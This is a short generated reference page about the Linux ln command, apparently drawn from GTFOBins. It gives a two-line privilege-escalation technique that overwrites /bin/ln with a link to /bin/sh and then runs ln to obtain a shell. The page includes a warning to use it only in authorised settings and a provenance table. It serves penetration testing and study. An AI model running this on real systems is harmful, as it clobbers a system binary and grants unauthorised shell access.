---
parsed_by: focuslocust
source: commands
type: generated
---
# ln Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## ln

Tool page: [ln](../../tools/linux/ln.md)

### privilege-escalation

```text
ln -fs /bin/sh /bin/ln
ln
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ln` |
| Evidence | Function example preserved from source parser. |
